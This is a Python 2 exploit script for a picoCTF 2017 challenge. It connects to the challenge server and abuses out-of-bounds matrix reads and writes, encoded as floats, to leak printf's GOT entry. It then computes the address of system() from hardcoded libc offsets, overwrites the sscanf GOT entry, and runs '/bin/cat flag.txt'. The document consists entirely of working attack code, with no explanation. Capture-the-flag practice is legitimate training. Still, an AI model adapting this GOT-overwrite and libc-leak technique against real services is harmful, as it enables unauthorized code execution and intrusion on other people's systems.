import struct, time, telnetlib
from socket import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 52501))

def send(payload):
    print payload
    s.send(payload+'\n')

def toFloat(address):
    address = struct.pack('<L', address)
    return struct.unpack('<f', address)[0]

def toHex(number):
    address = struct.unpack('<L', struct.pack('<f', number))[0]
    return "{0:0{1}x}".format(address,8)

print s.recv(64) #Welcome to the Matrix!
print s.recv(1024) #Enter command:

send("create 3 1")
print s.recv(64)
print s.recv(64)

send("create 1 1")
print s.recv(64)
print s.recv(64)

send("get 0 2 0")
print s.recv(64)
print s.recv(64)

#Point to printf GOT
number = toFloat(0x804a108) #printf
send("set 0 2 0 "+str(number))
print s.recv(64)
print s.recv(64)

#Get printf GOT address
send("get 1 0 0")
data = s.recv(64)
print data
print s.recv(64)

#Calculate system_libc
data = data[data.index("= ")+2:data.index('\n')]
number = float(data)
printf_libc = int(toHex(number), 16)
system_libc = printf_libc - 0x4cc70 + 0x3e3e0

#Point to sscanf GOT
number = toFloat(0x804a12c) #printf
send("set 0 2 0 "+str(number))
print s.recv(64)
print s.recv(64)

#Overwrite printf GOT address
number = toFloat(system_libc) #printf
send("set 1 0 0 "+str(number))
print s.recv(64)
print s.recv(64)

#Get the flag
send("/bin/cat flag.txt")
print s.recv(64)

s.close()
